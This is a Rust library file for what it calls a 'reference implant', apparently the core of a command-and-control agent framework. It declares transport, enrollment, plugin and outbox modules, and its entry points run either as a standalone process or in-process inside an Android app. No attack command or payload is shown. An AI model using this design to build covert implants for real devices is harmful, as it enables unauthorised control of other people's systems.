// The Rust reference implant's library core (architecture.md Sec 12.2).
// The whole machine lives here so it has three entries that share it: the
// standalone process (src/main.rs, the desktop legs), the Android carrier
// shell (carrier/, the cdylib android.app.NativeActivity loads in-process),
// and the C-ABI embedding surface (ffi.rs, the linkable core a non-Rust
// shell drives through a handful of rod_core_* symbols). One core, three
// shells, no protocol knowledge in any of them.

mod baked;
mod channel;
mod diag;
mod enroll;
mod envelope;
mod error;
mod handlers;
mod outbox;
mod plugins;
mod profile;
mod run;
mod sensitive;
mod session;
mod transport;
mod trust;
mod verify;
mod wire;

pub mod ffi;

// The profile both in-tree entries load: the fielded shape runs entirely
// off the bake; the dev shape, an empty bake, runs from ROD_* environment
// variables. The credential and kill-date gates live in the machine
// (run::Machine::new), shared by every entry -- a library loaded into
// another process must never exit it; the caller decides what an end state
// means.
fn load_profile() -> Option<profile::Profile> {
    profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
}

/// The standalone process entry's answer: the exit code the binary maps
/// onto `std::process::exit`.
pub fn standalone_main() -> i32 {
    let Some(profile) = load_profile() else {
        crate::diag!(
            "this build carries no baked profile and no ROD_* environment; nothing to run"
        );
        return 2;
    };
    match run::run(&profile) {
        run::Exit::Terminated(code) => code as i32,
        run::Exit::NoFront => 1,
    }
}

/// The in-process carrier entry: the same gates and the same machine, but
/// the end states end the thread, not the process -- the host (the
/// Android activity, say) owns the process lifetime and may restart the
/// loop by launching the carrier again.
pub fn carrier_run() {
    let Some(profile) = load_profile() else {
        crate::diag!(
            "this build carries no baked profile and no ROD_* environment; nothing to run"
        );
        return;
    };
    match run::run(&profile) {
        run::Exit::Terminated(code) => {
            crate::diag!("run terminated ({code}); the carrier thread ends");
        }
        run::Exit::NoFront => {
            crate::diag!("no front answered; the carrier thread ends");
        }
    }
}
